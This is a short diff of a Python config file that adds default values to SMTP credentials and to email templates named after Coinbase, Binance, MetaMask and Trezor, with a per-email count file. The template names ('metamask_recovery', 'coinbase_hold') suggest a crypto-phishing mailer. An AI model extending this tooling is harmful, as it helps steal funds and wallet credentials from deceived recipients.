@@ -10,10 +10,10 @@ load_dotenv(env_path)
 
 # SMTP Configuration
 SMTP_CONFIG = {
-    "server": os.getenv('SMTP_SERVER'),
-    "port": int(os.getenv('SMTP_PORT')),
-    "username": os.getenv('SMTP_USERNAME'),
-    "password": os.getenv('SMTP_PASSWORD')
+    "server": os.getenv('SMTP_SERVER', 'localhost'),
+    "port": int(os.getenv('SMTP_PORT', '587')),
+    "username": os.getenv('SMTP_USERNAME', ''),
+    "password": os.getenv('SMTP_PASSWORD', '')
 }
 
 # File Paths
@@ -23,10 +23,10 @@ EMAIL_COUNT_FILE = PROJECT_ROOT / 'data' / 'email_counts.json'
 
 # HTML Templates
 HTML_TEMPLATES = {
-    'coinbase_hold': os.getenv('COINBASE_TEMPLATE'),
-    'binance_verify': os.getenv('BINANCE_TEMPLATE'),
-    'metamask_recovery': os.getenv('METAMASK_TEMPLATE'),
-    'trezor_wallet': os.getenv('TREZOR_TEMPLATE')
+    'coinbase_hold': os.getenv('COINBASE_TEMPLATE', ''),
+    'binance_verify': os.getenv('BINANCE_TEMPLATE', ''),
+    'metamask_recovery': os.getenv('METAMASK_TEMPLATE', ''),
+    'trezor_wallet': os.getenv('TREZOR_TEMPLATE', '')
 }
 
 
